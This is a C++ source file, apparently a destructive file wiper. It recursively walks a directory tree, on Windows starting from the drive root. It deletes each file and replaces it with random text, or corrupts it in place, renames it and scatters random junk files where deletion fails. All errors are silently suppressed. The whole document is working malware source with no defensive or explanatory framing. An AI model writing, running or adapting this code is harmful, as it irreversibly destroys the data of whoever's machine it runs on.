#include <iostream>
#include <filesystem>
#include <vector>
#include <cstdio>
#include <fstream>
#include <ctime>

namespace fs = std::filesystem;
using namespace std;


char random_char() {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz";
    int len = sizeof(charset) - 1;
    return charset[rand() % len];
}

string get_code(int length) {
    string line;
    line.reserve(length + 10);
    for (int i = 0; i < length; i++) {
        line += random_char();
    }
    return line;
}

bool rename_file_and_get_status(const fs::path& old_path, const fs::path& new_path) {
    try {
        fs::rename(old_path, new_path);
        return true;
    }
    catch (...) {
        return false;
    }
}

void create_new_file(const fs::path& the_new_path) {
    try {
        ofstream new_clone_file(the_new_path);
        if (new_clone_file) {
            new_clone_file << get_code(100);
            new_clone_file.close();
        }
    }
    catch (...) {}
}

void many_clone_files(const fs::path& the_path, int origin_file_length, const fs::path& origin_file_extension, int file_amount) {
    try {
        int counter = 0;
        while(counter < 10) {
            string new_file_with_extension = get_code(origin_file_length) + origin_file_extension.string();
            const fs::path& the_new_path = the_path.parent_path() / new_file_with_extension;
            create_new_file(the_new_path);
            counter++;
        }
    }
    catch (...) {}
}

streamsize get_file_size(const fs::path& filepath) {
    try {
        ifstream file(filepath, std::ios::binary | std::ios::ate);
        if (!file) return -1;
        return file.tellg();
    }
    catch (...) {
        return -1;
    }
}

void write_in_middle(const fs::path& filepath) {
    try {
        streamsize size = get_file_size(filepath);
        if (size == -1) {
            //
        };
        
        streamsize middle_pos = size / 2;
        
        ifstream read_file(filepath, std::ios::binary);
        if (!read_file) {
            //
        };
        read_file.seekg(middle_pos);
        string tail_content((istreambuf_iterator<char>(read_file)), istreambuf_iterator<char>());
        read_file.close();
        
        fstream file(filepath, std::ios::in | std::ios::out);
        if (!file) {
            //
        }
        file.seekp(streampos(middle_pos));
        file << get_code(100) << tail_content;
        file.close();
    }
    catch (...) {
        //
    }
}

void path_finder(const fs::path& p) {
    try {
        for (const auto& entry : fs::directory_iterator(p)) {
            const fs::path& the_path = entry.path();
            if (fs::is_directory(entry.status())) {
                path_finder(the_path);
            } else {
                int origin_file_length = the_path.filename().string().size();
                const fs::path& origin_file_extension = the_path.extension();
                string new_file_with_extension = get_code(origin_file_length) + origin_file_extension.string();
                const fs::path& new_path = the_path.parent_path() / new_file_with_extension;
                try {
                    fs::remove(the_path);
                    create_new_file(the_path);
                }
                catch (...) {
                    write_in_middle(the_path);
                    if (rename_file_and_get_status(the_path, new_path)) {
                        create_new_file(the_path);
                    }
                    many_clone_files(the_path, origin_file_length, origin_file_extension, 10);
                }
            }
        }
    }
    catch (...) {
        cout << "Main error" << endl;
    }
}

int main() {
    srand(time(0));
    fs::path p;
    #if defined(_WIN32)
        p = "\\";
    #elif defined(__APPLE__)
        p = "/Users/pyisoe/skdlfjsdkfjsd/"; 
    #elif defined(__linux__)
        p = "/home/youruser/delete_test";
    #else
        #error "OS is not in the list."
    #endif
    path_finder(p);
    return 0;
}
